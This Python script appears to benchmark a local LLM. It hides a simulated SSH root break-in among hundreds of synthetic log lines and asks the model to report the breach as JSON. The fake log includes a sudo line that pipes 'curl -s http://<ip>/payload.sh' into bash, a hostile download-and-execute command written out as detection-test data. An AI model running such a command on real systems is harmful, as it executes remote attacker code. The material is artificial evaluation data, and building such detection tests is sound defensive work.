import os
import json
import time
import random
import requests
from datetime import datetime, timedelta
from dotenv import load_dotenv

# Try to import the transformers library, but don't make it a hard requirement.
try:
    from transformers import AutoTokenizer
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TRANSFORMERS_AVAILABLE = False

# Load environment variables from a .env file
load_dotenv()

# --- Configuration ---
# Your vLLM endpoint configuration
VLLM_URL = "http://art.lan:8000/v1/chat/completions"
VLLM_API_KEY = os.environ.get("VLLM_API_KEY", "your_api_key_here")
VLLM_MODELS_URL = "http://art.lan:8000/v1/models" # Endpoint to list available models

# Test Scale: Let's find the breaking point. Start with a safe value.
TARGET_LOG_LINES = 500


# ---------------------

def get_active_vllm_model():
    """
    Queries the vLLM server to determine the currently active model.

    Returns:
        str: The name of the active model, or None if not found or an error occurs.
    """
    print(f"[*] Querying vLLM server for active model at {VLLM_MODELS_URL}...")
    headers = {
        "Authorization": f"Bearer {VLLM_API_KEY}"
    }
    try:
        response = requests.get(VLLM_MODELS_URL, headers=headers, timeout=10)
        response.raise_for_status()
        models_data = response.json()
        if models_data and "data" in models_data and len(models_data["data"]) > 0:
            model_name = models_data["data"][0]["id"]
            print(f"[*] Detected active vLLM model: {model_name}")
            return model_name
        else:
            print("[!] No models found on the vLLM server.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to query vLLM models endpoint: {e}")
        return None


def generate_synthetic_logs(num_lines):
    """Generates a massive stream of normal server logs with one critical anomaly."""
    print(f"[*] Generating {num_lines} lines of synthetic logs...")
    logs = []
    base_time = datetime(2026, 7, 9, 10, 0, 0)

    normal_ips = ["192.168.1.50", "192.168.1.23", "10.0.0.5", "127.0.0.1"]

    rogue_ip = "185.15.59.202"
    anomaly_logs = [
        f"{(base_time + timedelta(minutes=15)).strftime('%b %d %H:%M:%S')} hal sshd[1422]: Failed password for root from {rogue_ip} port 39492 ssh2",
        f"{(base_time + timedelta(minutes=15, seconds=2)).strftime('%b %d %H:%M:%S')} hal sshd[1422]: Failed password for root from {rogue_ip} port 39492 ssh2",
        f"{(base_time + timedelta(minutes=15, seconds=4)).strftime('%b %d %H:%M:%S')} hal sshd[1422]: Accepted password for root from {rogue_ip} port 39492 ssh2",
        f"{(base_time + timedelta(minutes=15, seconds=5)).strftime('%b %d %H:%M:%S')} hal sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'curl -s http://{rogue_ip}/payload.sh | bash'"
    ]

    margin = min(500, num_lines // 4)
    insert_index = random.randint(margin, num_lines - margin)

    for i in range(num_lines):
        current_time = base_time + timedelta(seconds=i * 2)
        if i == insert_index:
            logs.extend(anomaly_logs)
            continue
        log_type = random.choice(["nginx", "syslog_cron", "syslog_ssh"])
        ip = random.choice(normal_ips)
        if log_type == "nginx":
            logs.append(
                f"{ip} - - [{current_time.strftime('%d/%b/%Y:%H:%M:%S +0000')}] \"GET /api/health HTTP/1.1\" 200 42 \"-\" \"Prometheus/2.45.0\"")
        elif log_type == "syslog_cron":
            logs.append(
                f"{current_time.strftime('%b %d %H:%M:%S')} hal CRON[912]: (root) CMD ( /usr/local/bin/metrics_sync.sh >/dev/null 2>&1)")
        else:
            logs.append(
                f"{current_time.strftime('%b %d %H:%M:%S')} hal sshd[1022]: Connection closed by authenticating user alex {ip} port 51232 [preauth]")

    return "\n".join(logs), rogue_ip, insert_index


def run_evaluation():
    model_name = get_active_vllm_model()
    if not model_name:
        print("[!] Could not determine active vLLM model. Exiting.")
        return

    tokenizer = None
    if TRANSFORMERS_AVAILABLE:
        try:
            print(f"[*] Loading tokenizer for {model_name}...")
            # trust_remote_code is often needed for modern tokenizers
            tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)
        except Exception as e:
            print(f"[!] Warning: Failed to load tokenizer: {e}")
            print("    Will fall back to rough estimation for token count.")
            tokenizer = None
    else:
        print("[!] Warning: 'transformers' library not found. Cannot calculate accurate token count.")
        print("    Please run 'pip install transformers' for accurate counts.")

    log_data, rogue_ip, insertion_point = generate_synthetic_logs(TARGET_LOG_LINES)
    print(f"[*] Anomaly hidden at line {insertion_point}. Threat IP is {rogue_ip}.")

    system_prompt = (
        "You are an elite Linux Cybersecurity Analyst monitoring a server named 'hal'. "
        "Review the following log dump and identify any successful breaches. "
        "You must respond ONLY with a valid JSON object containing exactly three keys: "
        "'breach_detected' (boolean), 'attacker_ip' (string or null), and 'root_cause_analysis' (string)."
    )
    
    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": f"Here are the logs:\n\n{log_data}"}
    ]

    payload = {
        "model": model_name,
        "messages": messages,
        "max_tokens": 2000,
        "temperature": 0.1,
        "frequency_penalty": 0.0,
        "presence_penalty": 0.0
    }

    # Accurately calculate token count if tokenizer is available
    if tokenizer:
        # This applies the model's specific chat template to the messages
        # and then tokenizes the result to get a precise count.
        token_ids = tokenizer.apply_chat_template(messages, add_generation_prompt=True)
        actual_token_count = len(token_ids)
        print(f"[*] Sending {actual_token_count} tokens to {model_name} on vLLM...")
    else:
        # Fallback to the old estimation
        estimated_tokens = TARGET_LOG_LINES * 18
        print(f"[*] Sending estimated ~{estimated_tokens} tokens to {model_name} on vLLM...")

    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {VLLM_API_KEY}"
    }

    start_time = time.time()
    try:
        response = requests.post(VLLM_URL, headers=headers, json=payload)
        response.raise_for_status()
        data = response.json()
    except Exception as e:
        print(f"[!] API Request Failed: {e}")
        if 'response' in locals():
            print(f"Response Body: {response.text}")
        return

    end_time = time.time()

    message = data['choices'][0]['message']
    content = message.get('content', '')
    reasoning = message.get('reasoning', '')

    print(f"\n--- REQUEST COMPLETED IN {round(end_time - start_time, 2)} SECONDS ---")

    if reasoning:
        print(f"\n--- AI REASONING (THOUGHTS) ---\n{reasoning.strip()}")

    print(f"\n--- FINAL JSON OUTPUT ---\n{content.strip()}")


if __name__ == "__main__":
    run_evaluation()